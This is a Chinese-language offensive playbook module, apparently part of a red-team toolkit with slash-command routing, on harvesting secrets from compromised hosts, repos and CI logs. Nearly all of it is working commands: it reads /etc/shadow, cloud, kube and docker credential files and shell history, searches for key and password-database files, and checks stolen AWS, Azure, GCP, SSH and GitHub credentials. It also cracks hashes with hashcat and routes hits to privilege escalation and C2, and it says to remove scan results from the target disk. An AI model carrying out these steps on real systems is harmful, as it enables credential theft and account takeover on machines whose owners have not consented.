# Secret discovery（磁盘 / 仓库 / CI）

> **TECH：** 在已授权访问的文件系统、repo、CI 日志里找密钥并校验  
> **IMPACT：** API key、云凭据、SSH、JWT、连接字符串  
> **成功：** 命中后校验有效  
> **不是：** IAM 提权、kubectl 打集群、改 GitHub OIDC（那些是 `/cloud-recon` `/k8s` `/cicd`）

---

## 1. 工具

**Titus**（Praetorian，2026，替代 Nosey Parker）：

https://github.com/praetorian-inc/titus

```bash
titus scan /path
titus scan .
```

以当前 CLI `--help` 为准。规则集来自 Nosey Parker + 校验能力；优先用它做整盘/整仓扫描。

补充：

```bash
trufflehog filesystem /path
trufflehog git file://./repo
gitleaks detect --source /path --no-git
gitleaks detect --source /path
```

有 git 历史用 gitleaks/trufflehog git 模式；只有落地目录用 filesystem。不要三个工具无脑全跑一遍大盘，Titus 先，补漏再用另外两个。

---

## 2. 手工高频路径

Linux（已有可读权限；shadow 需要 root）：

```bash
cat /etc/shadow
ls -l ~/.ssh /home/*/.ssh
cat ~/.aws/credentials ~/.aws/config
cat ~/.azure/msal_token_cache.bin 2>/dev/null
ls ~/.config/gcloud
cat ~/.kube/config
cat ~/.docker/config.json
env | grep -Ei 'KEY|TOKEN|SECRET|PASSWORD|AWS_|AZURE_|GOOGLE_'
cat ~/.bash_history ~/.zsh_history
```

Windows：

```cmd
dir /s /b %USERPROFILE%\.aws %USERPROFILE%\.azure %USERPROFILE%\.kube 2>nul
type %USERPROFILE%\.aws\credentials
dir /s /b C:\Users\*.kdbx C:\*.pfx C:\*.pem 2>nul
```

CI 落盘：`gitlab-ci` 日志、Jenkins `credentials.xml`、GitHub Actions `*.log`、runner 工作目录。解析出的 runner 控制归 `/cicd`，本模块只要 secret 本身。

---

## 3. 校验（本模块内做完）

```bash
# AWS
aws sts get-caller-identity --aws-access-key-id AKIA... --aws-secret-access-key '...'
# 或环境变量后
aws sts get-caller-identity

# Azure
az account show

# GCP
gcloud auth activate-service-account --key-file key.json
gcloud auth list

# SSH
ssh -i id_rsa -o StrictHostKeyChecking=no -o BatchMode=yes user@TARGET id

# GitHub PAT
curl -sH "Authorization: Bearer $TOKEN" https://api.github.com/user
```

校验成功记：身份 ARN/账户/login。**下一步枚举**候选：

```text
AWS/Azure/GCP 身份  → /cloud-recon
kubeconfig 可用     → /k8s
GitHub PAT          → /cicd 或 /recon（看操作者要打哪）
SSH 登录成功        → 若还要 root：/privesc-linux；若当 C2：/post
```

不要在这里 `iam:CreatePolicy` / `kubectl auth can-i` 当主路径。

---

## 4. Linux shadow / 其他系统哈希

```bash
unshadow /etc/passwd /etc/shadow > unshadow.txt
hashcat -m 1800 unshadow.txt /usr/share/wordlists/rockyou.txt
```

需要已经是 root（`/privesc-linux` 完成）。本模块只负责提取+破解。

---

## 5. 备份软件 / 版本洞

Veeam、某些密码管理器、旧备份代理可能有 **已知 CVE 把库解成明文**。这时：

```text
产品 + 精确版本
→ ../shared/cve-enrichment.md
→ 有稳定公开解密工具再跑
→ 得到的口令回到本模块分类
```

无 STABLE PoC 不编解密命令。利用目的仍是 secret，不是 RCE（RCE 归对应 attack 模块）。

---

## RESTORE

扫描只读。不要把 Titus 数据库/命中 JSON 留在目标盘；拉回操作机。
